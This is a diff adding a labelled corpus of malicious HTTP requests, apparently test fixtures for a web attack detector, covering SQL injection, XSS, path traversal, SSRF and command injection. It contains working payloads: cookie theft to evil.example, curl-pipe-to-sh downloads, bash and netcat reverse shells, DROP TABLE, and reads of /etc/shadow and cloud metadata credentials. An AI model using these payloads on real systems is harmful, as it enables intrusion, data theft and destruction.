@@ -1,0 +1,268 @@
+id	class	method	target	user_agent	content_type	headers	body	note
+# ---- SQL injection ----
+sqli-01	sqli	GET	/products?id=1+UNION+SELECT+1,2,3--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				plain union select
+sqli-02	sqli	GET	/products?id=1%20union%20select%20null,null,null--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				single-encoded union select
+sqli-03	sqli	GET	/products?id=-1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				union all select from users
+sqli-04	sqli	GET	/products?id=1%2520union%2520select%25201,2,3	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded union select
+sqli-05	sqli	GET	/products?id=1+UnIoN+SeLeCt+1,2	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				mixed-case union select
+sqli-06	sqli	GET	/products?id=1/**/union/**/select/**/1,2,3	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				comment-padded union select
+sqli-07	sqli	GET	/products?id=1+union%0a%0dselect+1,2	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				newline-padded union select
+sqli-08	sqli	GET	/products?id=1+union+(select+1,2)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				union with parenthesised select
+sqli-09	sqli	GET	/products?id=1/*!50000union*//*!50000select*/1,2,3	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				MySQL versioned-comment union
+sqli-10	sqli	POST	/login	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		username=admin&password=x%27+UNION+SELECT+1%2C2%2C3--+	union select in form body
+sqli-11	sqli	POST	/api/items	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"id":"1 UNION SELECT user,pass FROM users"}	union select in JSON body
+sqli-12	sqli	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Cookie: track=1%27%20union%20select%201,2--		union select in cookie
+sqli-13	sqli	GET	/products?id=-1+union+select+name,2+from+sqlite_master	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				sqlite union select
+sqli-14	sqli	GET	/login?user=admin%27+or+%271%27%3D%271&pass=x	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				classic quote tautology
+sqli-15	sqli	GET	/search?q=%27%20or%201%3D1--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				single-encoded or 1=1 with comment
+sqli-16	sqli	GET	/search?q=%2527%2520or%25201%253D1--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded or 1=1
+sqli-17	sqli	GET	/search?q=%27+OR+%27x%27%3D%27x	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				upper-case OR tautology
+sqli-18	sqli	POST	/login	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		username=admin%27+or+%271%27%3D%271&password=x	tautology in form body
+sqli-19	sqli	POST	/api/login	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"user":"admin' OR '1'='1","pass":"x"}	tautology in JSON body
+sqli-20	sqli	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Referer: http://shop.example.com/?q=%27%20or%201%3D1--		tautology in Referer
+sqli-21	sqli	GET	/item?id=1+and+1=1	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				numeric and 1=1
+sqli-22	sqli	GET	/item?id=1%20or%201=1	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				numeric or 1=1
+sqli-23	sqli	POST	/item	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		id=1+and+1%3D1	numeric tautology opening a form value
+sqli-24	sqli	POST	/item	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"id":"1 or 1=1"}	numeric tautology opening a JSON value
+sqli-25	sqli	GET	/login?u=%22+or+%22%22%3D%22	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-quote tautology
+sqli-26	sqli	GET	/login?u=%27)+or+(%271%27%3D%271	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				parenthesised tautology
+sqli-27	sqli	GET	/login?u=admin%27+or+1--+	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				quote or 1 then comment
+sqli-28	sqli	POST	/login	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		username=admin%27+or+1%23&password=x	quote or 1 then hash comment in body
+sqli-29	sqli	GET	/item?id=1'||'1'='1	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				pipe-concatenation tautology
+sqli-30	sqli	GET	/item?id=1;DROP+TABLE+users--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				stacked drop table
+sqli-31	sqli	GET	/item?id=1%3Bselect+*+from+users	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				stacked select
+sqli-32	sqli	POST	/signup	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		name=a%3BINSERT+INTO+users%28name%29+VALUES%28%27x%27%29	stacked insert in body
+sqli-33	sqli	GET	/item?id=1%253Bdrop%2520table%2520users	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded stacked drop
+sqli-34	sqli	GET	/item?id=1;exec+master..xp_cmdshell+'dir'--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				MSSQL xp_cmdshell
+sqli-35	sqli	GET	/item?id=1;waitfor+delay+'0:0:5'--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				MSSQL waitfor delay
+sqli-36	sqli	GET	/item?id=1+and+sleep(5)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				MySQL sleep
+sqli-37	sqli	GET	/item?id=1%27+and+sleep(5)--+	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				quoted MySQL sleep with comment
+sqli-38	sqli	GET	/item?id=1;select+pg_sleep(10)--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				PostgreSQL pg_sleep
+sqli-39	sqli	POST	/item	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		id=1%27+AND+SLEEP%285%29--+	sleep in form body
+sqli-40	sqli	GET	/item?id=1+and+benchmark(5000000,md5(1))	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				MySQL benchmark delay
+sqli-41	sqli	GET	/item?id=1+AND+SlEeP(5)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				mixed-case sleep
+sqli-42	sqli	GET	/item?id=1%27--	sqlmap/1.7.2#stable (https://sqlmap.org)				scanner user-agent plus quote-comment
+sqli-44	sqli	GET	/item?id=1+order+by+10--	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				order by column count probe
+sqli-45	sqli	GET	/item?id=1+and+(select+count(*)+from+information_schema.tables)>0	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				information_schema subquery
+sqli-46	sqli	GET	/item?q=information_schema.tables	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				bare information_schema
+sqli-47	sqli	GET	/item?id=1+and+(select+password+from+users+limit+1)>'a'	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				subquery against users
+sqli-48	sqli	GET	/item?id=1%2F%2A%2150000select%2A%2F+1	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded MySQL versioned comment
+sqli-49	sqli	POST	/api/search	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"q":"x'; DROP TABLE users; --"}	stacked drop in JSON body
+sqli-50	sqli	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Cookie: sid=abc%27%20and%201%3D1--		tautology in cookie
+# ---- Cross-site scripting ----
+xss-01	xss	GET	/search?q=%3Cscript%3Ealert(1)%3C/script%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded script tag
+xss-02	xss	GET	/search?q=<script>alert(1)</script>	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				raw script tag
+xss-03	xss	GET	/search?q=%253Cscript%253Ealert(1)%253C/script%253E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded script tag
+xss-04	xss	GET	/search?q=%3CsCrIpT%3Ealert(1)%3C/ScRiPt%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				mixed-case script tag
+xss-05	xss	GET	/search?q=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				nested script tag filter bypass
+xss-06	xss	GET	/search?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				img onerror
+xss-07	xss	GET	/search?q=%3Csvg%2Fonload%3Dalert(1)%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				svg onload with slash separator
+xss-08	xss	GET	/search?q=%253Csvg%252Fonload%253Dalert(1)%253E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded svg onload
+xss-09	xss	GET	/search?q=%3Ciframe+src%3Djavascript%3Aalert(1)%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				iframe with javascript url
+xss-10	xss	GET	/search?q=%3Ciframe+srcdoc%3D%22%3Cp%3Ehi%22%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				iframe srcdoc
+xss-11	xss	GET	/redirect?url=javascript:alert(document.domain)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				javascript uri
+xss-12	xss	GET	/redirect?url=java%0Ascript:alert(1)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				javascript uri split by newline
+xss-13	xss	GET	/redirect?url=javascript%3Aalert(1)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				javascript uri with encoded colon
+xss-14	xss	GET	/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				data html uri
+xss-15	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E	script tag in form body
+xss-16	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"comment":"<script>alert(1)</script>"}	script tag in JSON body
+xss-17	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		comment=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E	img onerror in form body
+xss-18	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"bio":"<svg onload=alert(1)>"}	svg onload in JSON body
+xss-19	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		comment=%253Cscript%253Ealert(1)%253C%252Fscript%253E	double-encoded script in form body
+xss-20	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"comment":"<script>alert(1)</script>"}	JSON unicode-escaped script tag
+xss-21	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"comment":"&lt;script&gt;alert(1)&lt;/script&gt;"}	entity-escaped script tag
+xss-22	xss	GET	/home	<script>alert(1)</script>				script tag in User-Agent
+xss-23	xss	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Referer: http://evil.example/?<script>alert(1)</script>		script tag in Referer
+xss-24	xss	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		Cookie: name=<script>alert(1)</script>		script tag in cookie
+xss-25	xss	GET	/home	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0		X-Forwarded-For: <img src=x onerror=alert(1)>		img onerror in X-Forwarded-For
+xss-26	xss	POST	/profile	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"bio":"<body onload=alert(1)>"}	body onload in JSON
+xss-27	xss	GET	/search?q=%22+onmouseover%3D%22alert(1)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				attribute breakout with handler and alert
+xss-28	xss	GET	/search?q=%27+onfocus%3D%27alert(1)%27+autofocus%3D%27	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				attribute breakout with onfocus
+xss-29	xss	GET	/search?q=<details/open/ontoggle=alert(1)>	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				details ontoggle
+xss-30	xss	GET	/search?q=%3Cimg+src%3Dx+onerror%3Dthis.src%3D%27http%3A%2F%2Fevil.example%2F%3Fc%3D%27%2Bdocument.cookie%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				cookie theft payload
+xss-31	xss	GET	/search?q=%3Cobject+data%3Djavascript%3Aalert(1)%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				object with javascript url
+xss-32	xss	GET	/search?q=%3CBODY%20ONLOAD%3Dalert(1)%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				upper-case body onload
+xss-33	xss	GET	/search?q=%3Cscript%20src%3D%2F%2Fevil.example%2Fx.js%3E%3C%2Fscript%3E	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				external script include
+xss-34	xss	GET	/search?q=%u003cscript%u003ealert(1)%u003c/script%u003e	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				%u-encoded script tag with alert
+xss-35	xss	POST	/comment	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		comment=%3Ciframe+src%3D%2F%2Fevil.example%3E%3C%2Fiframe%3E	iframe in form body
+# ---- Path traversal and local file inclusion ----
+trav-01	traversal	GET	/download?file=../../../../etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				plain traversal to passwd
+trav-02	traversal	GET	/download?file=..%2f..%2f..%2fetc%2fpasswd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				single-encoded traversal
+trav-03	traversal	GET	/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded traversal
+trav-04	traversal	GET	/download?file=..%5c..%5c..%5cwindows%5cwin.ini	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				backslash traversal to win.ini
+trav-05	traversal	GET	/download?file=....//....//....//etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				filter-evading dot sequence
+trav-06	traversal	GET	/download?file=/etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				absolute path to passwd
+trav-07	traversal	GET	/download?file=/proc/self/environ	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				proc self environ
+trav-08	traversal	GET	/download?file=../../etc/passwd%00.jpg	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				null-byte truncation
+trav-09	traversal	GET	/view?page=../../../../boot.ini	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				boot.ini
+trav-10	traversal	GET	/view?page=c%3A%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				windows system32 path
+trav-12	traversal	GET	/download?file=..%2F..%2Fetc%2Fpasswd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				upper-case hex escapes
+trav-13	traversal	GET	/download?file=..%u2216..%u2216windows%u2216win.ini	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				%u-encoded separator
+trav-14	traversal	GET	/static/..%2f..%2f..%2fetc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				traversal in the path
+trav-15	traversal	GET	/static/../../../../etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				raw traversal in the path
+trav-16	traversal	GET	/app/..;/..;/WEB-INF/web.xml	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				tomcat path-parameter traversal
+trav-17	traversal	POST	/download	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		file=..%2F..%2F..%2Fetc%2Fpasswd	traversal in form body
+trav-18	traversal	POST	/download	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"path":"/etc/passwd"}	passwd as JSON value
+trav-19	traversal	POST	/download	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		file=../../../../etc/passwd	raw traversal in form body
+trav-20	traversal	POST	/download	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		template=....//....//etc/passwd	filter-evading dots in body
+trav-21	traversal	POST	/download	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"f":"../../../proc/self/environ"}	three levels to proc in JSON
+trav-22	traversal	GET	/download?file=/etc/shadow	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				shadow file
+trav-23	traversal	GET	/download?file=file:///etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				file scheme to passwd
+trav-24	traversal	GET	/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				dot-encoded traversal
+trav-25	traversal	GET	/download?file=..%252f..%252fetc%252fpasswd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded slash only
+trav-26	traversal	GET	/view?file=..%5c..%5cwindows%5csystem.ini	sqlmap/1.7.2#stable (https://sqlmap.org)				two backslash levels, system.ini
+trav-28	traversal	GET	/download?file=/etc/hosts	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				hosts file
+trav-29	traversal	GET	/download?file=/proc/version	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				proc version
+trav-30	traversal	GET	/download?file=/WEB-INF/web.xml	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				WEB-INF descriptor
+# ---- Remote file inclusion and SSRF ----
+incl-01	inclusion	GET	/fetch?url=http://169.254.169.254/latest/meta-data/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				AWS metadata
+incl-02	inclusion	GET	/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded AWS metadata
+incl-03	inclusion	GET	/fetch?url=http%253A%252F%252F169.254.169.254%252F	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded AWS metadata
+incl-04	inclusion	POST	/import	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"url":"http://169.254.169.254/latest/user-data"}	AWS metadata in JSON
+incl-05	inclusion	POST	/import	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		url=http%3A%2F%2F169.254.169.254%2F	AWS metadata in form body
+incl-06	inclusion	GET	/fetch?url=http://metadata.google.internal/computeMetadata/v1/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				GCP metadata
+incl-07	inclusion	GET	/fetch?url=http://localhost:8080/admin	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				localhost
+incl-08	inclusion	GET	/fetch?url=http://127.0.0.1:22/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				loopback address
+incl-09	inclusion	GET	/proxy?target=http://10.0.0.5/internal	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				10/8 address
+incl-10	inclusion	GET	/proxy?u=http://192.168.1.1/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				192.168/16 address
+incl-11	inclusion	GET	/proxy?u=http://[::1]/admin	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				IPv6 loopback
+incl-12	inclusion	POST	/hooks	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"webhook":"http://127.0.0.1:6379/"}	loopback in JSON webhook field
+incl-13	inclusion	POST	/import	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		image_url=http%3A%2F%2Flocalhost%2Fadmin	loopback in form url field
+incl-14	inclusion	GET	/fetch?url=gopher://127.0.0.1:6379/_INFO	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				gopher scheme
+incl-15	inclusion	GET	/fetch?url=file:///etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				file scheme
+incl-16	inclusion	GET	/fetch?u=dict://localhost:11211/stats	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				dict scheme
+incl-17	inclusion	GET	/index.php?page=http://evil.example/shell.txt	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				classic remote file inclusion
+incl-18	inclusion	GET	/index.php?page=http%3A%2F%2Fevil.example%2Fshell.txt%3F	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded remote file inclusion
+incl-19	inclusion	POST	/index.php	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		include=http%3A%2F%2Fevil.example%2Fx.php	remote include in form body
+incl-20	inclusion	GET	/index.php?file=ftp://evil.example/x.php	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				ftp inclusion
+incl-21	inclusion	POST	/hooks	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"url":"gopher://127.0.0.1:25/_MAIL"}	gopher in JSON
+incl-22	inclusion	GET	/fetch?url=http://2130706433/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				decimal loopback
+incl-23	inclusion	GET	/fetch?url=http://0x7f000001/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				hex loopback
+incl-24	inclusion	GET	/fetch?url=http://172.16.0.9/	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				172.16/12 address
+incl-25	inclusion	POST	/hooks	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"callback_url":"http://10.1.2.3/hook"}	private address in JSON callback field
+# ---- OS command injection ----
+cmdi-01	cmdi	GET	/ping?host=127.0.0.1;cat+/etc/passwd	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				semicolon cat passwd
+cmdi-02	cmdi	GET	/ping?host=8.8.8.8;id	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				semicolon id
+cmdi-03	cmdi	GET	/ping?host=8.8.8.8|whoami	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				pipe whoami
+cmdi-04	cmdi	GET	/ping?host=8.8.8.8&&whoami	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double ampersand whoami
+cmdi-05	cmdi	GET	/ping?host=$(whoami)	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				dollar-paren whoami
+cmdi-06	cmdi	GET	/ping?host=`id`	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				backtick id
+cmdi-07	cmdi	GET	/ping?host=8.8.8.8;wget+http://evil.example/x.sh+-O+/tmp/x	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				semicolon wget
+cmdi-08	cmdi	GET	/ping?host=8.8.8.8%3Bcat%20%2Fvar%2Flog%2Fauth.log	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				encoded semicolon cat
+cmdi-09	cmdi	GET	/ping?host=8.8.8.8%253Bcat%2520%252Fvar%252Flog%252Fauth.log	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				double-encoded semicolon cat
+cmdi-10	cmdi	POST	/ping	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		host=8.8.8.8%3Bid%3B	semicolon id in form body
+cmdi-11	cmdi	POST	/ping	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		host=8.8.8.8+%26%26+cat+%2Fvar%2Flog%2Fsyslog	double ampersand in form body
+cmdi-12	cmdi	POST	/ping	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/json		{"host":"x; curl http://evil.example/s | sh"}	semicolon curl in JSON body
+cmdi-13	cmdi	POST	/ping	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0	application/x-www-form-urlencoded		host=%24%28curl+http%3A%2F%2Fevil.example%2Fx%7Csh%29	command substitution in form body
+cmdi-14	cmdi	GET	/x?cmd=bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				bash reverse shell
+cmdi-15	cmdi	GET	/x?c=;nc+-e+/bin/sh+10.0.0.1+4444	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				netcat reverse shell
+cmdi-16	cmdi	GET	/x?cmd=/bin/sh+-c+id	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				sh -c
+cmdi-17	cmdi	GET	/x?cmd=cmd.exe+/c+whoami	Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0				cmd.exe /c
